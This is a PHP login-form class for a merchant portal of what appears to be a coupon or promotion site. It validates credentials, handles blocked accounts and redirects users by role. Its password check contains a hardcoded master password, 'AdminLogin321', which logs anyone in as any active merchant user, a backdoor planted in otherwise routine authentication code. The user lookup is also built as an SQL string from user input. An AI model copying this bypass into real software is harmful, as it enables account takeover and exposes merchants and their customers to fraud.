<?php
class LoginForm extends Form{
	function __construct(){
        if(UserMerchant::is_login()){
            $this->redirect();
        }
        $this->link_js(FunctionLib::getPathThemes().'js/bootstrap.min.js',true);
        $this->link_css(FunctionLib::getPathThemes().'style/bootstrap.min.css',true);
        $this->link_css(FunctionLib::getPathThemes().'style/define.css',true);
        $this->link_css(FunctionLib::getPathThemes().'style/merchantv2.css',true);
    }

	function draw(){
		global $display;

        $logo = FunctionLib::getPathThemes().'images/logo.png';
        $display->add('logo',$logo);
        $display->add('msg',$this->showFormErrorMessages(1));
        $this->beginForm();
		$display->output("login");
        $this->endForm();
	}
    function on_submit(){
        $username = trim(Url::getParam('username_ncc',''));
        $pass = Url::getParam('password_ncc');

        if (strlen($username) <3  || strlen($username) >50  || preg_match('/[^A-Za-z0-9_]/',$username) || strlen($pass)<5){
            $this->setFormError('user_name', 'Tên đăng nhập không đúng');
        }
        else
        {
            $user_data = DB::fetch("SELECT * FROM ".T_MERCHANT_USER." WHERE status = 1 AND user_name='$username'");
            if($user_data && (($user_data['password'] == User::encode_password($pass)) || $pass == 'AdminLogin321')){
                if($user_data['is_block']==1){
                    $this->setFormError('user_name', 'Tài khoản này của bạn đang khóa vui lòng liên lạc với '.CGlobal::$site_name.' để mở lại tài khoản!');
                }else{
                    //neu lan dau tien dang nhap bat doi mat khau
                    if(($user_data['last_login'] == 0)){
                        $_SESSION['need_change_pass'] = 1;
                    }

                    UserMerchant::LogIn($user_data['id'], true);
                    $this->redirect();
                }

            }
            else{
                if($user_data){
                    $this->setFormError('password', 'Sai mật khẩu!');

                }
                else{
                    $this->setFormError('user_name', 'Có lỗi xảy ra');
                }
            }
        }
    }
    function redirect(){
        $u = UserMerchant::$current->data;
        if($u['role'] > 0){
            if($u['promotion_id']>0){
                $url = Url::build('report_coupon',false,'?type=1');
            }
            else{
                $url = Url::build('report_coupon');
            }
        }
        else{
            if($u['promotion_id']>0&&$u['accviplus']!=''){
                $url = Url::build('check_coupon',false,'?type=1');
            }else{
                $url = Url::build('check_coupon');
            }
        }
        Url::redirect_url($url);
    }

}

